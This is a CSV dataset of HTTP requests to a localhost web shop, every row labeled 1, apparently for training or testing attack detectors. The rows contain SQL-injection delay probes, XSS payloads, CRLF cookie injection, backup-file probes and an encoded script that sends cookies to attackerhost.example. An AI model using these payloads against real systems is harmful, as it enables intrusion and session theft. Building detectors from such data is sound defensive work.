Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL,timestamp,source_ip,dest_port
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=616C69ECE334E3E0CA577C3D0F14CB87,,close,,,1,http://localhost:8080/_cti_pvt/uniqperm.cnf HTTP/1.1,2025-10-14 22:38:00,192.168.1.142,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=20C2ED6C7B3EA7C49AE8C2FF4E176702,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,2025-10-14 22:39:00,192.168.1.143,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5698D175E45DBC68914D765299EF6A4F,application/x-www-form-urlencoded,Connection: close,Content-Length: 239,modo=registro&login=sheraton&password=d%F3m9d01&nombre=Selenia&apellidos=Vi%F1as+Batle&email=tiger%40risiberia.eu&dni=05265898W&direccionA=Callejon+Jorge+Juan%2C+135+&ciudad=Arafo&cp=09300&provincia=Zamora&ntc=9475523758342240&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2025-10-14 22:40:00,192.168.1.144,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E8C48EF8D1DCFA5932093D0E83C7367E,application/x-www-form-urlencoded,Connection: close,Content-Length: 249,modo=registro&login=usa9&password=ENjuaGaDiEnTES&nombre=Johana&apellidos=Colldevall&email=scepi%4014horas.ao&dni=04746545N&direccion=Ro*nda+Ebre%2B%2C+144+5-*D&ciudad=Villota+del+P%E1ramo&cp=43694&provincia=La+Rioja&ntc=0365839887327935&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2025-10-14 22:41:00,192.168.1.145,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=087CC65236F823C1E83A83DA69B066F9,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,2025-10-14 22:42:00,192.168.1.146,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=ADB1439C68A19339549E421E8BCAD5EC,application/x-www-form-urlencoded,Connection: close,Content-Length: 34,errorMsgA=Credenciales+incorrectas,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,2025-10-14 22:43:00,192.168.1.147,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=73021F9D97B76A361FC1C83EF76F81E4,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito HTTP/1.1,2025-10-14 22:44:00,192.168.1.148,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=952C108A12EC2BD79ECC5973C49F55AD,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=676&B1=Confirmar%2F HTTP/1.1,2025-10-14 22:45:00,192.168.1.149,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EA315D612BB7C5DE3772A27380ED75E1,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=corless&pwd=4958el%EDsimo&remember=on%2F&B1=Entrar HTTP/1.1,2025-10-14 22:46:00,192.168.1.150,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=D896807AC35FC23F241BAEA7B19D15A1,,close,,,1,http://localhost:8080/databasenotes.html HTTP/1.1,2025-10-14 22:47:00,192.168.1.151,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F83D104165A85462324ECB8923132D08,application/x-www-form-urlencoded,Connection: close,Content-Length: 137,id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Queso+Manchego&precio=100&cantidad=64&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2025-10-14 22:48:00,192.168.1.152,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7A71F4D134E1B31AB2B64AE6A979503B,application/x-www-form-urlencoded,Connection: close,Content-Length: 271,modo=registro&login=sayeeda2&password=ce5ast20c%3Fea&nombre=Rafi&apellidos=Trill+Argando%F1a&email=ardisson%40ajuntamentdebarcelona20.nf&dni=21898288B&direccion=Pl.+Libertad+192%2C+&ciudad=Torres+del+Carrizal&cp=16393&provincia=Albacete&ntcA=9343823588037445&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2025-10-14 22:49:00,192.168.1.153,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6460CA880D30AE323484F5CAACCBDCED,,close,,,1,http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,2025-10-14 22:50:00,192.168.1.154,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F6A89D44BFCF4BEA7D63BCA0A7AE472B,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=harianto&password=provicero&nombre=Sans%F3n&apellidos=Obrador+Scolari&email=putikiat%40tobarisch.mh&dni=40813041R&direccion=Riera+De+Sant+Andreu%2C+S%2FN%2C+&ciudadA=Arroyomolinos+de+Le%F3n&cp=16195&provincia=Huesca&ntc=6785859877248336&B1=Registrar HTTP/1.1,2025-10-14 22:51:00,192.168.1.155,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9E995B1FFAA5611C21E240768D98BA35,,close,,,1,http://localhost:8080/asf-logo-wide.gif HTTP/1.1,2025-10-14 22:52:00,192.168.1.156,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=30EF6D1D0753B1534A84F235FA48BE2B,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=200&B1=Pasar+por+caja%2500 HTTP/1.1,2025-10-14 22:53:00,192.168.1.157,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=2B9DC6BEDB7A5E50F9B06DDF4EAF3ED5,application/x-www-form-urlencoded,Connection: close,Content-Length: 46,modo=insertar&precio=6838&B1=Pasar+por+caja%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2025-10-14 22:54:00,192.168.1.158,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=15DF6C1AD18A738D251599CFAABB1696,application/x-www-form-urlencoded,Connection: close,Content-Length: 46,modo=insertar&precio=6450&B1=Pasar+por+caja%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2025-10-14 22:55:00,192.168.1.159,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=EA382356FDDC0CD0FCCD35253A068D5C,application/x-www-form-urlencoded,Connection: close,Content-Length: 236,modo=registro&login=capes&password=desemperezar&nombre=Itallia&apellidos=Ayarza+Quintal&email=wei%40alfombra.com.gw&dni=82166751X&direccion=Llan%E7a+16+&ciudad=%2FSe%2Fn%E9%3Fs&cp=31522&provincia=Zamora&ntc=0723351625880614&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2025-10-14 22:56:00,192.168.1.160,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8C027CAA8D47A6AF8C334DE3E78AC0CC,application/x-www-form-urlencoded,Connection: close,Content-Length: 302,modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2025-10-14 22:57:00,192.168.1.161,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B1AEACE433AD37F58A6DC532F04D137B,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=northrop&pwdA=desbullar&remember=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2025-10-14 22:58:00,192.168.1.162,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CD80C86B05557391A5E2961E51686B4A,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&login=meaghan&pwd=SUspIRAr&remember=off%2F&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2025-10-14 22:59:00,192.168.1.163,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=06D961C409D9CD06F7C90209A22FF0D1,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1,2025-10-14 23:00:00,192.168.1.164,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B918E7EEED7771D6980FDB885A8FBEF9,application/x-www-form-urlencoded,Connection: close,Content-Length: 248,modo=registro&login=arnold&password=5na.0m7gR5D2&nombre=Marcelino&apellidos=Conill+Crous&email=figueras-haufrect%40freetag.no&dni=72263814E&direccion=C%2F+Catalanes+84+13E&ciudad=Talamanca&cp=26573&provincia=Soria&ntc=9766753613033509&B1A=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2025-10-14 23:01:00,192.168.1.165,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=38E2B1F753590A67ED80F3E7181807DF,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2609&B1=Pasar+por+caja HTTP/1.1,2025-10-14 23:02:00,192.168.1.166,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C3DE9BCCFEDA592130C54ACDF4A2A705,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=346&B1A=Confirmar HTTP/1.1,2025-10-14 23:03:00,192.168.1.167,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=05BD237CEDBCE58DCA81CFBC2B6EE26B,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9044&B1=Pasar+por+caja%2F HTTP/1.1,2025-10-14 23:04:00,192.168.1.168,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E2F64A4D857D3A80524CB8E4E3808FC5,application/x-www-form-urlencoded,Connection: close,Content-Length: 57,B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1,2025-10-14 23:05:00,192.168.1.169,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CD2596E5A956FE1684211727D272E1A3,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=58%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito HTTP/1.1,2025-10-14 23:06:00,192.168.1.170,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=C4C3122343102DFB9C9F73025D5E15A3,,close,,,1,http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.gif/.old HTTP/1.1,2025-10-14 23:07:00,192.168.1.171,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=16C23BC882186F16991425F1020E0813,,close,,,1,http://localhost:8080/tienda1/asf-logo-wide~ HTTP/1.1,2025-10-14 23:08:00,192.168.1.172,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A10331906ABD973E0D52D90B789F3C0C,application/x-www-form-urlencoded,Connection: close,Content-Length: 34,errorMsgA=Credenciales+incorrectas,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1,2025-10-14 23:09:00,192.168.1.173,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=08DB9F9AE4E7D737653B34332979033E,application/x-www-form-urlencoded,Connection: close,Content-Length: 271,modo=registro&login=arron&password=boDegoNcillo&nombreA=Betiana&apellidos=Argente+Botifoll&email=peckinpah-keams%40juguetespersonales.tz&dni=10867689M&direccion=Periodista+Juanito+Cortes%2C+95+&ciudad=Marug%E1n&cp=38770&provincia=Badajoz&ntc=6222371193056945&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2025-10-14 23:10:00,192.168.1.174,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=41DE9D0011E552F4717A05E95FF992CA,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pic&password=emba%3Fulada&nombre=Cruz&apellidos=Puyal+Catalan&email=eastside-luco%40apicultor.ms&dni=39658514M&direccion=C%2F+Don+Juan+De+Aguilar+168%2C+&ciudad=Nava%2C+La&cp=31284&provincia=Le%F3n&ntcA=6217533099373869&B1=Registrar HTTP/1.1,2025-10-14 23:11:00,192.168.1.175,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=73AF3ABC73B5928C3A8A037BE7361266,application/x-www-form-urlencoded,Connection: close,Content-Length: 271,modo=registro&loginA=tejani&password=arable&nombre=Josiana&apellidos=De+Anta+Colondres&email=agunda-wulff%40onoratoinformatica.aq&dni=24339028Z&direccion=C%2F+Jose+Zamoray%2C+S%2FN+4C&ciudad=Narros+del+Puerto&cp=23770&provincia=Tarragona&ntc=2400850921681991&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2025-10-14 23:12:00,192.168.1.176,80
POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=9C37E68F0F1C8338DCA667FE9C3D616A,application/x-www-form-urlencoded,Connection: close,Content-Length: 262,modo=registro&login=kimble&password=toLEmaicA&nombre=Liberia&apellidos=Porcel+Tonk&email=kedrova%40pablobracamonte.hn&dni=12439508G&direccion=Madre+Carmen+Del+Ni%F1o+Jesus%2C+48+&ciudad=Torremormoj%F3n&cp=03738&provinciaA=Girona&ntc=9728949065368673&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2025-10-14 23:13:00,192.168.1.177,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=A39C9CEC3172763A34B28CD4B9D5349F,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1980&B1=Confirmar HTTP/1.1,2025-10-14 23:14:00,192.168.1.178,80
GET,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=BDAD4227757EE8CCC741C84CBB43089F,,close,,,1,http://localhost:8080/tienda1/imagenes/logo.gif.Bak HTTP/1.1,2025-10-14 23:15:00,192.168.1.179,80
